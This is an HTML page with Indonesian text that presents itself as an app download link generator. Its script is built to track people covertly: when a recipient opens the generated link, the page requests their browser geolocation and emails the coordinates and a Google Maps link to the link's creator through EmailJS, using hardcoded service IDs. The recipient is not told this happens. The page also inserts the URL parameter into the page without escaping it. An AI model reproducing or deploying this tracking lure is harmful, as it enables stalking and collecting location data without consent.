<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Unduh Aplikasi</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 40px;
      text-align: center;
      background: #f4f4f4;
    }
    input, button {
      padding: 12px;
      width: 90%;
      max-width: 500px;
      margin: 10px auto;
      display: block;
      font-size: 1em;
    }
    .btn {
      background: #d40000;
      color: white;
      border: none;
      cursor: pointer;
      border-radius: 5px;
    }
    .btn:hover {
      background: #b30000;
    }
    .btn-download {
      background: #28a745;
      color: white;
      padding: 15px 25px;
      font-size: 1.2em;
      text-decoration: none;
      border-radius: 6px;
    }
    .link-box {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="app">Memuat...</div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    // Inisialisasi EmailJS
    (function(){
      emailjs.init("Egjkid9OxRNxmTG7l"); // Ganti dengan User ID dari EmailJS
    })();

    const app = document.getElementById("app");
    const params = new URLSearchParams(window.location.search);
    const linkParam = params.get("link");

    if (linkParam) {
      // Mode: pengguna kedua melihat tombol download
      app.innerHTML = `
        <h2>üì• Tautan Anda Siap</h2>
        <a class="btn-download" href="${decodeURIComponent(linkParam)}" target="_blank">Klik tautan</a>
      `;

      // Kirim lokasi pengguna kedua secara otomatis
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationText = `üìç Lokasi Pengguna Kedua\nLatitude: ${lat}\nLongitude: ${lon}\nLink: https://www.google.com/maps?q=${lat},${lon}`;

            emailjs.send("cam123", "camauto123", {
              message: locationText
            }).then(
              function(response) {
                console.log("‚úÖ Lokasi berhasil dikirim.");
              },
              function(error) {
                console.error("‚ùå Gagal kirim lokasi:", error);
              }
            );
          },
          function(error) {
            console.error("‚ùå Gagal mendapatkan lokasi:", error.message);
          }
        );
      } else {
        console.warn("Geolocation tidak didukung di browser ini.");
      }

    } else {
      // Mode: host membuat link
      app.innerHTML = `
        <h2>üîó Masukkan Link Download Anda</h2>
        <input type="text" id="downloadLink" placeholder="https://example.com/file.apk" />
        <button class="btn" onclick="buatLink()">üîí Buat Link</button>
        <div class="link-box" id="hasil"></div>
      `;

      window.buatLink = function () {
        const link = document.getElementById("downloadLink").value.trim();
        if (!link) {
          alert("Masukkan link download terlebih dahulu!");
          return;
        }
        const encoded = encodeURIComponent(link);
        const hasilLink = `${location.origin}${location.pathname}?link=${encoded}`;
        document.getElementById("hasil").innerHTML = `
          Bagikan link ini ke pengguna kedua:<br>
          <input type="text" value="${hasilLink}" readonly onclick="this.select()" />
        `;
      };
    }
  </script>
</body>
</html>
